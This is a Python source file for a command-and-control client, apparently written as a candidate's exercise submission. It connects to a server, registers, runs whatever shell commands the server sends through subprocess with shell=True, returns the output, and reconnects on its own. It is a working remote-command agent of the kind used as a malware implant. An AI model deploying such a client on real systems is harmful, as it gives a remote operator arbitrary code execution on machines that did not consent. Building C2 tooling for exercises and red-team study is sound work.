"""
C2 Client Implementation
Supports Steps 1-5 with modular design

Author: [Candidate]
References:
- AsyncIO patterns: https://stackoverflow.com/questions/48506460/python-simple-socket-client-server-using-asyncio
- Subprocess execution: https://docs.python.org/3/library/subprocess.html
"""

import asyncio
import json
import logging
import time
import uuid
import os
import argparse
import subprocess
from typing import Dict
from message import Message

# ==================== CONFIGURATION ====================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ==================== MESSAGE HANDLING ====================

async def send_message(writer, message: Message) -> bool:
    """Send JSON message"""
    try:
        logger.info(f"Sending message of type: {message.type}")
        writer.write(message.to_payload())
        await writer.drain()
        return True
    except Exception as e:
        logger.error(f"Failed to send message: {e}")
        return False

async def receive_message(reader) -> Message:
    """Receive JSON message"""
    try:
        logger.info("Waiting for message...")
        length_data = await asyncio.wait_for(reader.readexactly(4), timeout=30)
        length = int.from_bytes(length_data, 'big')
        logger.info(f"Received message length: {length}")
        
        payload = await asyncio.wait_for(reader.readexactly(length), timeout=30)
        return Message.from_payload(payload)
    except asyncio.TimeoutError:
        logger.debug("Receive timeout (normal for idle connections)")
        return None
    except asyncio.IncompleteReadError:
        logger.debug("Connection closed")
        return None
    except Exception as e:
        logger.error(f"Failed to receive message: {e}")
        return None

# ==================== CORE C2 CLIENT LOGIC ====================

class C2Client:
    """Main C2 Client"""
    
    def __init__(self, server_host: str, server_port: int, client_id: str):
        self.server_host = server_host
        self.server_port = server_port
        self.client_id = client_id
        self.reader = None
        self.writer = None
        self.running = True
        self.command_queue = asyncio.Queue()
    
    async def connect(self) -> bool:
        """
        Connect to C2 server and register
        """
        try:
            self.reader, self.writer = await asyncio.open_connection(
                self.server_host,
                self.server_port
            )
            logger.info(f"Connected to server at {self.server_host}:{self.server_port}")
            
            # Send registration message
            await send_message(
                self.writer,
                Message.as_register(self.client_id)
            )
            
            # Receive acknowledgment
            logger.info("Waiting for acknowledgment...")
            ack = await receive_message(self.reader)
            if ack and ack.type == "ack":
                logger.info(f"Registered as {ack.client_id}")
                return True
            else:
                logger.error("Registration failed")
                return False
        
        except Exception as e:
            logger.error(f"Connection failed: {e}")
            return False
    
    async def reconnect_loop(self):
        """
        Auto-reconnect logic
        Attempts to reconnect every 5 seconds if disconnected
        """
        reconnect_delay = 5
        max_delay = 60
        
        while self.running:
            try:
                if not self.reader or not self.writer:
                    logger.info(f"Attempting to reconnect in {reconnect_delay}s...")
                    await asyncio.sleep(reconnect_delay)
                    
                    if await self.connect():
                        reconnect_delay = 5
                        # Restart main loop
                        await self.main_loop()
                    else:
                        reconnect_delay = min(reconnect_delay * 1.5, max_delay)
                else:
                    await asyncio.sleep(1)
            
            except Exception as e:
                logger.error(f"Reconnect loop error: {e}")
                await asyncio.sleep(reconnect_delay)
    
    async def main_loop(self):
        """
        Main client loop
        STEP 1: Wait for commands
        STEP 4: Async with heartbeat handling
        """
        tasks = [
            asyncio.create_task(self._command_listener()),
            asyncio.create_task(self._command_processor()),
        ]
        
        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            logger.info("Client main loop cancelled")
            pass
        finally:
            logger.info("Client canceling tasks")
            for task in tasks:
                task.cancel()
    
    async def _command_listener(self):
        """
        STEP 1 & 4: Listen for incoming commands from server
        """
        while self.running and self.reader and not self.reader.at_eof():
            try:
                logger.info("Listening for command")
                msg = await receive_message(self.reader)
                
                if not msg:
                    # Connection closed or timeout
                    break
                
                if msg.type == "command":
                    # Queue command for execution
                    await self.command_queue.put({
                        "cmd_id": msg.cmd_id,
                        "command": msg.command
                    })
                    logger.info(f"Received command: {msg.command}")
                
                else:
                    logger.warning(f"Unknown message type: {msg.type}")
            
            except Exception as e:
                logger.error(f"Command listener error: {e}")
                break
        
        # Connection lost, trigger reconnect
        if self.writer:
            self.writer.close()
            self.reader = None
            self.writer = None
    
    async def _command_processor(self):
        """
        STEP 1 & 4: Execute commands from queue
        STEP 4: Async execution with subprocess.run_in_executor
        """
        loop = asyncio.get_event_loop()
        
        while self.running:
            try:
                # Get command with timeout
                logger.info("Waiting for command in _command_processor")
                cmd_data = await asyncio.wait_for(self.command_queue.get(), timeout=1.0)
                
                cmd_id = cmd_data.get("cmd_id")
                command = cmd_data.get("command")
                
                logger.info(f"Executing: {command}")
                
                start_time = time.time()
                
                if command.lower() == "kill":
                    logger.info("Kill command received, exiting")
                    result = "Client killed by server"
                    self.running = False
                    # Close reader to stop listener from reading
                    if self.reader:
                        self.reader.feed_eof()
                
                elif command.lower().startswith("echo"):
                    # Extract the echo text
                    parts = command.split(None, 1)
                    result = parts[1] if len(parts) > 1 else ""  # fake response. not running the actual command
                
                else:
                    # Run command asynchronously in thread pool
                    result = await loop.run_in_executor(
                        None,
                        self._execute_bash_command,
                        command
                    )
                
                exec_time_ms = (time.time() - start_time) * 1000
                
                # Send result back to server
                if self.writer and not self.writer.is_closing():
                    await send_message(
                        self.writer,
                        Message.as_result(cmd_id, result, exec_time_ms)
                    )
                    logger.info(f"Result sent ({exec_time_ms:.1f}ms)")
                
                # Exit after sending kill result
                if not self.running:
                    return
                # if not self.running:
                #     os._exit(0)  # Force exit
            
            except asyncio.TimeoutError:
                continue
            except Exception as e:
                logger.error(f"Command processor error: {e}")


    
    def _execute_bash_command(self, command: str) -> str:
        """
        STEP 4: Execute bash-style command
        Supports pipes, redirects, etc.
        
        Reference:
        https://docs.python.org/3/library/subprocess.html
        """
        try:
            # Use shell=True to support pipes, redirects
            # WARNING: this is a security risk in production
            # For testing/exercise, it's acceptable
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                timeout=30,
                text=True
            )
            
            # Combine stdout and stderr
            output = result.stdout
            if result.stderr:
                output += f"\n[stderr] {result.stderr}"
            
            return output if output else "[No output]"
        
        except subprocess.TimeoutExpired:
            return "[Command timed out after 30s]"
        except Exception as e:
            return f"[Error: {str(e)}]"
    
    async def start(self):
        """Start the C2 client"""
        logger.info(f"Starting C2 client (ID: {self.client_id})")
        
        # Try initial connection
        if await self.connect():
            # Start main loop and reconnect loop
            await asyncio.gather(
                self.reconnect_loop(),
                self.main_loop()
            )
        else:
            logger.error("Failed to connect, starting reconnect loop")
            await self.reconnect_loop()

# ==================== MAIN ====================

async def main():
    parser = argparse.ArgumentParser(description="C2 Client")
    parser.add_argument("--server-host", default="127.0.0.1", help="Server host")
    parser.add_argument("--server-port", type=int, default=5000, help="Server port")
    parser.add_argument("--client-id", default=None, help="Client ID (auto-generated if not provided)")

    args = parser.parse_args()

    # Generate client ID if not provided
    client_id = args.client_id or f"client-{uuid.uuid4().hex[:8]}"
    
    client = C2Client(args.server_host, args.server_port, client_id)
    
    try:
        await client.start()
    except KeyboardInterrupt:
        logger.info("Client shutdown")
        client.running = False

if __name__ == "__main__":
    asyncio.run(main())